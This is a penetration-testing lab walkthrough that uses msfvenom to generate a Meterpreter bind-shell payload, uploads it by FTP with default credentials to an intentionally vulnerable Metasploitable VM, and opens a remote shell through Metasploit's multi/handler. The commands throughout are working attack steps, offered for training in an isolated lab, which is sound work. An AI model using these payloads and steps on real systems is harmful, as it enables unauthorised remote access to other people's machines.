- [ ] Pasitikrinti ar viskas veikia

**Lab Objective:**

Learn how to establish a bind shell on a Linux target using Msfvenom and Metasploit.

**Lab Purpose:**

Msfvenom is a command line instance of Metasploit that is used to generate payloads and can also encode them. How payloads are produced for different purposes is explained in detail in lab 74. It is recommended that you look there for more information.

The Metasploit framework is a powerful tool which can be used to probe systematic vulnerabilities on networks and servers. It provides information about security vulnerabilities and aids in penetration testing and IDS signature development.

**Lab Tool:**

Kali Linux and Metasploitable VM.

**Lab Topology:**

You can use Kali Linux in a VM for this lab.

**Lab Walkthrough:**

### Task 1:

If you are unfamiliar with metasploitable, it is an intentionally vulnerable machine which can be loaded in VMware, the same as Kali Linux. You can download the metasploitable iso file here: [https://docs.rapid7.com/metasploit/metasploitable-2/](https://docs.rapid7.com/metasploit/metasploitable-2/)

You can find a lot of material on this page on how to download and setup the Metasploitable VM.

![msfvenom](attachements/msfvenom-3.png)

We will use both Kali Linux and Metasploitable for this lab. Remember to put both machines on the same isolated host-only network to talk to each other. When login is required, you will enter “**msfadmin**” as username and password.

### Task 2:

Both msfvenom and metasploit come pre installed on Kali. We can view the help screen for both tools by typing the following into our terminal:

msfvenom

msfconsole

In this lab, we will be generating a bind shell payload using msfvenom, and then using Metasploit to establish a handler which will connect to the target. The goal is to establish a shell on our Metasploitable VM.

### Task 3:

To begin, we will first need to create a payload for our Metasploitable VM. To do this, we will use the following command:

msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=5555 -f elf -o bind.elf

![msfvenom](attachements/msfvenom-4.png)

Once this is done, type “file bind.elf ” in your terminal and you should see details of the payload file you just created in your home directory.

### Task 4:

In this step, we will somehow place the payload file on the target machine. Make sure Metasploitable VM is up and running. In this case, we will be transferring the file through FTP. To do this, open a terminal in Kali VM and type the following (1):

ftp 192.168.56.102

192.168.56.102 is the IP address of our Metasploitable VM in this instance. When asked, enter msfadmin as the username and password (2).

We will use the “put“ command in FTP to send the payload file to the target machine (3). Next to the “put” command, we will write the name of the payload file, which is “bind.elf” in this case. After the transfer is complete, let’s make sure that the payload file is at the target location by typing “ls”

![Metasploitable VM](attachements/Metasploitable_VM-5.png)

(4). Finally, we end the FTP session by typing “by” (5).

Our evil binary file has been placed on the victim machine now.

### Task 5:

We then need to make this file executable on our Metasploitable VM. In our Kali terminal screen type the following (1):

![Metasploitable VM](attachements/Metasploitable_VM-4.png)

ssh [msfadmin@192.168.56.102](mailto:msfadmin@192.168.56.102)

Type yes when asked if you are sure you want to connect to this host. Then, type msfadmin for the password when prompted (2). We are now connected to our Metasploitable VM through SSH.

We can now make the payload executable by typing the following (3):

chmod +x bind.elf

Once this is done, leave the SSH connection to our Metasploitable VM open and open a new terminal. We will now need to establish the handler which will connect to our target, which will be listening for our connection when our payload is executed.

### Task 6:

To establish the handler, we will be using Metasploit. Start the tool by typing the following:

msfconsole

Then type the following command to specify that we want to establish a handler (1):

use exploit/multi/handler

Once the multi/handler is selected, we need to specify three things: the remote host which we want to connect to, the local port, and the payload type. We can do this by typing the following commands into the terminal (2,3,4):

set rhost 192.168.56.102  
set lport 5555  
set payload linux/x86/meterpreter/bind_tcp

![Metasploitable VM](attachements/Metasploitable_VM-6.png)

Once these commands are entered, we will then go back to our SSH connection screen with our Metasploitable VM.

### Task 7:

Finally, we can execute the payload on our target. Navigate back to the tab with the established SSH connection. Then, type the following:

./bind.elf

Once you hit enter, return to the tab which has the Metasploit handler open and type “run” (1). Metasploit will then connect to the target and send the exploit stage; we will then have a meterpreter shell on our target.

When we execute our payload on the Metasploitable VM, we establish a listener on port 5555 on our target. The handler then connects to our target on port 5555, and sends the stage to establish a shell (2). This is how bind shells work.

![Metasploitable VM](attachements/Metasploitable_VM-7.png)

You will see a meterpreter session has been started and is now open. We have successfully established a stable shell! We can access the shell by typing “shell“ into meterpreter (3). Type “whoami” and “id” commands in this remote shell (4). We can return to the Meterpreter interface from the shell by typing “exit“ into the shell (5).